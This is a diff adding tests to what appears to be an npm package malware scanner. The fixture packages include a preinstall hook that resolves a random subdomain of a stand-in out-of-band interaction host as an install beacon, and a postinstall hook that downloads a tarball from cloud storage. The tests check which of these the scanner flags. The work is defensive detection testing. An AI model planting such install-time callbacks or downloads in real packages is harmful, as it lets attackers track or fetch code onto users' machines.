@@ -212,3 +212,43 @@ class TestSystemDiskWrite:
             tmp_path, "demo-imager", {"version": "1.0.0", "main": "index.js"}, {"index.js": code}
         )
         assert self.RULE not in Npm.findings(pkg)
+
+
+class TestInstallBeaconToAnIssuedHost:
+    """A preinstall that only resolves an interaction service's issued host: no data leaves, the
+    lookup is the message (review 98 P4 #2). The host is reserved and nothing runs."""
+
+    RULE = "MALWARE.EXFIL.TRACKING_CALLBACK.001"
+    HOOK = (
+        "require('dns').resolve('k3j4h5g6f7d8s9a0q1w2e3r4t5y6u7i8.oast.example', function(){});\n"
+    )
+
+    def test_a_preinstall_resolving_an_issued_random_host(self, tmp_path) -> None:
+        pkg = Npm.build(
+            tmp_path,
+            "demo-probe",
+            {"version": "99.0.0", "scripts": {"preinstall": "node index.js"}},
+            {"index.js": self.HOOK + "module.exports = {};\n"},
+        )
+        assert Npm.findings(pkg).get(self.RULE) == Severity.CRITICAL
+
+    def test_the_same_lookup_in_a_library_nothing_installs_with(self, tmp_path) -> None:
+        pkg = Npm.build(
+            tmp_path,
+            "demo-probe",
+            {"version": "1.0.0", "main": "index.js"},
+            {"index.js": "module.exports = () => " + self.HOOK},
+        )
+        assert self.RULE not in Npm.findings(pkg)
+
+    def test_a_hook_downloading_from_a_storage_account(self, tmp_path) -> None:
+        code = (
+            "require('https').get('https://mystorageaccount2024abc.blob.core.windows.net/t.tgz');\n"
+        )
+        pkg = Npm.build(
+            tmp_path,
+            "demo-dl",
+            {"version": "1.0.0", "scripts": {"postinstall": "node install.js"}},
+            {"install.js": code},
+        )
+        assert self.RULE not in Npm.findings(pkg)
